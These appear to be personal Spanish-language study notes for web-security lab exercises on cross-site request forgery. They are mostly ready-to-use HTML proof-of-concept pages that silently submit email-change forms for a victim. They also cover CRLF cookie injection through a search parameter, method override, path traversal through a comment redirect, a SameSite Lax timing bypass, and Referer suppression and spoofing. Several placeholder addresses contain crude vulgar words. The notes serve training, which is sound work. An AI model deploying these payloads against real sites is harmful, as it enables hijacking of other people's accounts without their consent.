1. Engagment tools --> CSRF normal sin token CSRF

2. change request method --> engagement tools --> CSRF normal y quitar token, con method a GET

3. Change-email  -->  Engagement tools --> quitar CSRF token --> cambiar email

4. Me logeo con un user con INTERCEPT ON --> COPY CSRF TOKEN --> DROP REQUEST --> mando csrf de change-email o change-password a víctima con ese token que está en whitelist

5.pruebo si me logeo con carlos con cookie:csrfkey y CSRFtoken  de wiener --> si es positivo -->

si veo un search para buscar en / creo CSRF y entrego a la víctima -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
			<script>history.pushState('', '', '/');</script>
    <form action="https://lab.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="dame&#64;normal&#45;user&#46;sexo" />
      <input type="hidden" name="csrf" value="sY5ywjCMxV5dHAqBlhmyR8VCdPY2uDV6" />   <-- csrf de wiener
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://lab.net/?search=test%0d%0aSet-Cookie:%20csrfKey=nJi7xlnNEBdScTXjcAEdPNHwfSm3xyWE%3b%20SameSite=None" onerror="document.forms[0].submit()" />  <--csrfKey de wiener
  </body>
</html>


6.  pruebo si cambio l mail con valores random pero iguales en csrf y csrf --> si es positivo, entrego a víctima -->

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<script>history.pushState('', '', '/');</script>
    <form action="https://lab.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sexualizante&#64;aa&#45;sfe&#46;eee" />
      <input type="hidden" name="csrf" value="DATENPULAMEA" /> --> ponemos mismo CSRF
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://lab.net/?search=test%0d%0aSet-Cookie:%20csrf=DATENPULAMEA%3b%20SameSite=None" onerror="document.forms[0].submit()" />  --> ponemos mismo CSRF
  </body>
</html>


7. change request method y añadimos a la url un &_method=POST --> hay discrepancias ya que no admite enviar datos por metodo GET

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3c0008048c458482b80b1800230025.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="assef&#64;asef&#46;com" />
      <input type="hidden" name="_method" value="POST" /> --> los campos ocultos se los traga
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

8. Vemos que en login su politica de cookie es Strict pot lo que no permite una redirección externa con JS
Hay un archivo js que nos dice como se comporta el sitio
Hacemos un Path Traversal, pudiendo cambiar la password
<script>
window.location="https://lab.net/post/comment/confirmation?postId=../my-account/change-email?email=dameunalata@sexo.xom%26submit=1";
</script>

9.

10. al ver el change-email y ver que el /social-login el Samesite está vacío, por defecto es LAX habrá que lanzar el atque antes de 2 mins de logearse la víctima

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tehackeo&#64;nano&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
<p>Clicka</p>
    <script>
    window.onclick = () => {
        window.open('https://lab.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
  </body>
</html>


11. si al cambiar el Referer sale un error 400, podemos decirle en el exploit server que acepte todos los referers

<html>
<meta name="referrer" content="never">  --> añadimos esta línea
<meta name="referrer" content="no-referrer"> --> probar esta también
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sexoguarro&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


12. Si vemos que en el referer podemos poner --> https://bagpulamata.academylab.net o https://academylab.net.bagpulamata --> server exploit
HEAD:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://lab/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="sexo&#64;mu&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?lab.net');  --> añadimos esta URL
      document.forms[0].submit();
    </script>
  </body>
</html>
